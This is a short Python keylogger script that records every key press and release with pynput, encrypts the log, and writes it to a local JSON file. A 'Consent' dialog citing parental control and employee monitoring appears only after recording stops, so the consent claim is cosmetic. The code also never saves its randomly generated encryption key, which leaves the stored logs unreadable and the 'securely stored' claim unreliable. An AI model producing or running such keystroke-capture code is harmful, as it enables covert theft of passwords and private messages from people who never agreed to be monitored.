from pynput import keyboard
import json
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import messagebox

key_list = []
x = False

# Generate a random key for encryption
encryption_key = Fernet.generate_key()
cipher_suite = Fernet(encryption_key)

def update_json_file(key_list):
    # Encrypt the key_list before saving to the JSON file
    encrypted_data = cipher_suite.encrypt(json.dumps(key_list).encode())
    with open('Logs.json', 'wb') as key_strokes_file:
        key_strokes_file.write(encrypted_data)

def on_press(key):
    global x, key_list
    key_list.append({'Pressed': str(key)})
    
    if not x:
        x = True
        key_list.append({'Held': str(key)})
        update_json_file(key_list)

def on_release(key):
    global x, key_list
    key_list.append({'Released': str(key)})
    x = False
    update_json_file(key_list)

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# GUI to display consent and information about keylogging
root = tk.Tk()
root.withdraw()
messagebox.showinfo("Consent", "This application is designed for legitimate use cases like parental control, employee monitoring, and data recovery. Make sure to use it responsibly and adhere to privacy laws. All keystrokes will be encrypted and securely stored.")
root.mainloop()
